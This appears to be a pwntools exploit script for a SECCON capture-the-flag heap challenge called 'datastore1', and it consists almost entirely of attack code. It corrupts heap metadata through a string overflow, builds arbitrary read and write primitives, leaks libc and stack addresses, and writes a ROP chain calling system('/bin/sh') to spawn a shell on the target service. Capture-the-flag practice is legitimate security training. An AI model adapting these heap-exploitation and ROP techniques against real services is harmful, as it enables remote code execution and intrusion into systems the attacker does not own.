from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'datastore1.seccon.games'
PORT = 4585
#HOST = '172.17.0.3'
#PORT = 9999

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		#return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [0x1419])



def list():
    r.sendlineafter(b'> ', b'2')

def add_value(pos, value, array=False):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'1')
    r.recvuntil(b'type:')
    if array == True:
        r.sendlineafter(b'> ', b'a')
    else:
        r.sendlineafter(b'> ', b'v')
    if type(value) == str: # str
        value = value.encode()
    if type(value) != bytes: # int, float 
        value = str(value).encode()
    r.sendlineafter(b': ', value)

def edit_str(pos, s):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', s)

def delete_value(pos):
    for n in pos:
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'index: ', str(n).encode())
    r.sendlineafter(b'> ', b'2')

def add_array(pos, n):
    add_value(pos, n, array=True)

add_array([], 15)
add_array([0], 15)
add_array([1], 0)
delete_value([1])
add_value([1], b'a' * 0x30)
delete_value([0, 15])
add_value([0, 15], 0x1337)
#edit_str([1], b'a'*0x20+flat(0xdead, 0xbeef) ) # heap overflow

add_array([2], 2)
add_array([3], 2)

add_value([2, 0], b'b' * 0x10)
edit_str([1], b'a'*0xd0+flat(0, 0x31, 2, 0xfeed0003))

list()
r.recvuntil(b' <I> ')
leak = int(r.recvuntil(b'\n', True))
dbg('leak')
heap = leak - 0x500
dbg('heap')

for i in range(10):
    add_value([0, 4+i], b'x'*0x40)
add_value([0, 4+10], flat(0x21, 0x21) * 4)


def aaw(where, what):
    payload = b''
    payload += b'c'*0x20
    payload += flat(len(what)+1, where)
    payload = payload.ljust(0xd0, b'd')
    payload += flat(0, 0x31, 2, 0xfeed0002)
    edit_str([1], payload)
    edit_str([2, 0], what)

def aar(where):
    payload = b''
    payload += b'c'*0x20
    payload += flat(9, where)
    payload = payload.ljust(0xd0, b'd')
    payload += flat(0, 0x31, 2, 0xfeed0002)
    edit_str([1], payload)
    list()
    r.recvuntil(b'[02] <ARRAY(2)>')
    r.recvuntil(b'<S> ')
    leak = u64(r.recvuntil(b'\n', True).ljust(8, b'\x00'))
    return leak

aaw(heap+0x5e8, p64(0x521))
delete_value([3])
leak = aar(heap+0x5f0)
dbg('leak')
base = leak -0x219ce0
environ = base + 0x221200
rdi = base + 0x001bc061
leak = aar(environ)
dbg('leak')
target = leak -0x120
binsh = base + 0x1d8698
system = base+ 0x50d60
puts = base + 0x80ed0
aaw(target, flat(rdi+1, rdi, binsh, system))
#leak = aar(target)
#dbg('leak')


r.sendlineafter(b'> ', b'0')

r.interactive()
r.close()
